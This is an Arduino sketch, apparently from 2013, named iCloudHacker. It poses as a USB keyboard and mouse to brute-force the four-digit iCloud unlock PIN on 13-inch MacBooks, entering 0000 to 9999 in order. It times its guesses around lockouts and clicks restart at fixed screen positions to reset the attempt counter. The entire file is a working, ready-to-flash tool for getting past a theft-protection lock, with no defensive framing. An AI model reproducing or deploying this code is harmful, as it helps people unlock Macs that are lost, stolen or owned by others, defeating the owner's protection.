// Kelaghn Noy - 2013
// ###################
// USE THIS CODE IF YOU HAVE A 13.3" MACBOOK
// ##########################################
// Compile this code to an Arduino microcontroller and connect using USB
// iCloudHacker will automatically begin brute-forcing the iCloud unlock PIN 
// Maximum brute forcing time: 60 hours
// Tested with 2010 & 2012 13" Macbooks

#include <usb_keyboard.h>
#include <usb_mouse.h>

const int ledpin = 13;
int waitcounter = 0;
int guesscounter = 0;
char guess[5]="0000";

void resetMouse() { for(int i=0; i<6; i++) { Mouse.move(-127, 127); delay(200); } }
void moveMouse(int x, int y) { Mouse.move(x, y); delay(200); }
void pressKeyboard(int key) { Keyboard.press(key); delay(200); Keyboard.release(key); delay(500); }

void setup() {
  pinMode(ledpin, OUTPUT);
  keyboard_modifier_keys = 0;
  delay(5000);                               // Wait for 5s before starting
  resetMouse();
  moveMouse(127, -127);                      // Move mouse over wifi popup and close it
  moveMouse(127, -127);
  moveMouse(127, 0);
  Mouse.click(MOUSE_LEFT); 
  delay(500);
  pressKeyboard(KEY_ESC);
  delay(500);
  Mouse.click(MOUSE_LEFT);
  delay(200);
}

void loop(){
  if(waitcounter == 5) delay(65000);         // Hit 1 minute lockout, wait until we get another chance
  else if(waitcounter == 6) {                // Hit 5 minute lockout, let's reboot instead of waiting
    digitalWrite(ledpin, HIGH);
    delay(20000);                            // Wait 45s before restarting in case we hit the right PIN
    resetMouse();                            // Move mouse over the restart button
    moveMouse(127, -45);
    moveMouse(127, 0);
    moveMouse(100, 0);
    Mouse.click(MOUSE_LEFT);                 // Click restart & wait for it to reboot
    delay(95000);
    resetMouse();
    moveMouse(127, -127);                    // Move mouse over wifi popup and close it
    moveMouse(127, -127);
    moveMouse(127, 0);
    Mouse.click(MOUSE_LEFT); 
    delay(500);
    pressKeyboard(KEY_ESC);
    delay(500);
    Mouse.click(MOUSE_LEFT); 
    digitalWrite(ledpin, LOW);
    waitcounter = -1;
  }
  waitcounter++;

  if(guesscounter <= 9999) {
    delay(1000);                              // Wait 1 second between entries
    digitalWrite(ledpin, HIGH);
    snprintf(guess, 6, "%04d", guesscounter);
    pressKeyboard(guess[0]);
    pressKeyboard(guess[1]);
    pressKeyboard(guess[2]);
    pressKeyboard(guess[3]);
    pressKeyboard(KEY_RETURN);
    digitalWrite(ledpin, LOW);
  } else {                                    // Flash LED continuously when we're done
    while(true) {
      digitalWrite(ledpin, HIGH);
      delay(100);
      digitalWrite(ledpin, LOW);
      delay(100);
    }
  }
  guesscounter++;
}
